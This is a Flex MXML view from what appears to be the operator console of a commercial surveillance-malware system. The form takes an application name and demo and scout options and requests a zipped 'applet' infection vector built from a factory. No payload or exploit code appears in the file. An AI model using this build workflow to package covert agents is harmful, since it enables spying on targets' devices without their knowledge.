<?xml version="1.0" encoding="utf-8"?>
<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
         xmlns:s="library://ns.adobe.com/flex/spark" 
         xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%" xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">
  
  <fx:Script>
    <![CDATA[
      import it.ht.rcs.console.monitor.controller.LicenseManager;
      import it.ht.rcs.console.operations.view.configuration.ConfigurationView;
      import it.ht.rcs.console.task.controller.DownloadManager;
      import it.ht.rcs.console.utils.AlertPopUp;
      
      import locale.R;
      
      import mx.core.UIComponent;
      import mx.managers.PopUpManager;
      import mx.rpc.events.FaultEvent;
      import mx.rpc.events.ResultEvent;
      
      [Bindable]
      private var _platform:String;
      
      [Bindable]
      public var configView:ConfigurationView;

      protected function create():void
      {
        var params:Object = {platform: 'applet', generate: {platforms: [parentDocument.platform], 
                                                            binary: {demo: createBtn.demo.selected, admin: false}, 
                                                            melt: {admin: false, scout:createBtn.scoutCh.selected} },
                             melt: {appname: appname.text} }
          
        params['factory'] = {_id: parentDocument.factory._id};
        
        var filename:String = parentDocument.factory.name + '_applet.zip'
        
        DownloadManager.instance.createTask("build", filename, params, onSuccess, onFailure);
      }
      
      private function onSuccess(e:ResultEvent):void
      {
        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
      }
      
      private function onFailure(e:FaultEvent):void
      {
        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
      }
      
      public function set platform(platform:*):void
      {
        if (platform == null)
          return;
        
        _platform = platform;
        
        createBtn.platforms = [platform];
      }
    ]]>
  </fx:Script>

  <s:VGroup>
    <s:HGroup left="10" top="10" verticalAlign="middle">
      
      <s:Label fontWeight="bold" text="{R.get('APPLICATION_NAME')}" visible="{!LicenseManager.instance.scout}"/>    
      <s:TextInput id="appname" text="" visible="{!LicenseManager.instance.scout}"/>
      
    </s:HGroup>
    
    <s:TextArea id="warning" fontWeight="bold" editable="false" borderVisible="false" 
                text="Please contact HT technical support to create this vector"
                width="100%" height="65" contentBackgroundAlpha="0"/>    
  </s:VGroup>

  <build:CreateWithDemoButton id="createBtn" left="10" bottom="0" right="10" create="{create}" enabled="{!LicenseManager.instance.scout}" configView="{configView}"/>
  
</s:Group>